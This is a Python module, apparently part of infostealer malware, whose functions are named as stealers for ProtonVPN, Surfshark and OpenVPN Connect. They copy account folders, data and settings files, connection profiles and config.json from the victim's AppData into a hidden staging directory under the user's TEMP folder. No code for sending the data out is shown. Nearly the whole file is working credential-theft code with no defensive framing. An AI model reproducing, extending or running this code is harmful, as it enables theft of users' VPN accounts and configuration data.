import os
import shutil
import re

def create_dir(path):
    """Crea un directorio si no existe."""
    os.makedirs(path, exist_ok=True)

def copy_file(src, dst):
    """Copia un archivo desde la ruta src a dst."""
    try:
        shutil.copy2(src, dst)
    except Exception as e:
        print(f"Error al copiar archivo {src} a {dst}: {e}")

def copy_dir(src, dst):
    """Copia un directorio completo desde src a dst."""
    try:
        shutil.copytree(src, dst, dirs_exist_ok=True)
    except Exception as e:
        print(f"Error al copiar directorio {src} a {dst}: {e}")

def protonvpn_stealer():
    protonvpn_folder = os.path.join(os.getenv("LOCALAPPDATA"), "ProtonVPN")
    if not os.path.exists(protonvpn_folder):
        return

    protonvpn_account = os.path.join(folder_vpn, "ProtonVPN")
    create_dir(protonvpn_account)

    pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")

    for root, dirs, files in os.walk(protonvpn_folder):
        for dir_name in dirs:
            if pattern.match(dir_name):
                src_path = os.path.join(root, dir_name)
                dst_path = os.path.join(protonvpn_account, dir_name)
                copy_dir(src_path, dst_path)

def surfsharkvpn_stealer():
    surfsharkvpn_folder = os.path.join(os.getenv("APPDATA"), "Surfshark")
    if not os.path.exists(surfsharkvpn_folder):
        return

    surfsharkvpn_account = os.path.join(folder_vpn, "Surfshark")
    create_dir(surfsharkvpn_account)

    files = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]

    for file in files:
        src_path = os.path.join(surfsharkvpn_folder, file)
        dst_path = os.path.join(surfsharkvpn_account, file)
        if os.path.exists(src_path):
            copy_file(src_path, dst_path)

def openvpn_stealer():
    openvpn_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "OpenVPN Connect")
    if not os.path.exists(openvpn_folder):
        return

    openvpn_accounts = os.path.join(folder_vpn, "OpenVPN")
    create_dir(openvpn_accounts)

    profiles_path = os.path.join(openvpn_folder, "profiles")
    if os.path.exists(profiles_path):
        copy_dir(profiles_path, openvpn_accounts)

    config_path = os.path.join(openvpn_folder, "config.json")
    if os.path.exists(config_path):
        copy_file(config_path, openvpn_accounts)

folder_vpn = os.path.join(os.getenv("TEMP"), os.getenv("USERNAME").lower(), "vpn")

def run():
    protonvpn_stealer()
    surfsharkvpn_stealer()
    openvpn_stealer()

if __name__ == "__main__":
    run()
